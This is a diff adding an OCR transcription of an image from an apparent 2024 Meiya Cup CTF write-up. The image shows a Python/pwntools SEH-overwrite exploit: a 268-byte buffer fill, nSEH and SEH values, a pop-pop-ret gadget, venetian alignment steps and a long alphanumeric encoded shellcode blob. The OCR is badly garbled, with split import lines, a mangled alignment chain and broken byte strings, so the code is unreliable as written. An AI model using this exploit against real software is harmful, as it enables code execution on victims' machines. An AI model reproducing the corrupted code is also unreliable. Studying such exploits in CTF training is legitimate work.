@@ -1,0 +1,39 @@
+# OCR: bb5a616ffcbe16cfa3043820504d3c79.webp
+# 来源: ./02-WriteUp/2024/2024-美亚杯-团队赛/bb5a616ffcbe16cfa3043820504d3c79.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:21
+
+from
+pwn
+import
+shutil
+import
+os.path
+import buffer
+nseh seh padd
+eax_align= eax_align+= eax_align+= eax_align+= eax_align += eax_align+= eax_align+= eax_align+= eax_align += eax_align+= eax_align+= eax_align+= shellcode=（
+x41★268 1x59/x71* x151x43" x71**0x55
+"1x47" x51 1x71 x58 Nx71
+#x05/x24x11 1x71
+x2d/x111x11
+x71" x50 x71 xc3";
+材料2
+# 268 bytes tofillthe buffer
+-0x00590071（aharmlesspadding)
+#next SEH address
+# SEH handler#padding
+-0x00430015:pop ecx;pop ebpret
+# venetian pad/align#pushecx
+# venetian pad/align
+#pop eax
+# venetian pad/align
+#addeax,0x11002300
+#venetianpad/align
+#subeax.@x11001100
+#venetian pad/align#push eax
+→eax=0019e1a0
+→eax=0019F3DC
+# pad to align the following ret# ret into eax?
+PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1"AI0IAIOI111AIAJOYAZBABABABABkMAGB9u4JBkLzHrbM0iDm0c0bi7u01Ep1TBkb0nPdKR2zlrknrKdDK42Kx"Jo6WpJnFLqiofLMl1QallBLloogQxOzmjagW7rZRObpWBkNrZpdKMzmlBkNlzq1hZCoHKQwab1dKQIKp9qiCrk"myKhGsLzoYtKMdTKkQJ6ma9odLgQ80JmM1vg08iPD5yfjcSMjXOKQmnDRUhdaH4KR8mTIq7c2FDKjlpKrkaHML JaZ3dKItrkYghPU9Mt04KtOk1KC1QI1JNqKo9P10OogJtKn2HkRmOmazjatMbe7BYpm0kPRoPhmadKRODGioj57"KgpmMnJzjoxDfceemCmYo9EmlivcL9zE0ikWpQe9ugKowKcprpo2Jip23KOHUQSaQol33Lns5PxrEKPAA
+shellcode=buffer+nseh+seh+eax_align+padd+shellcode
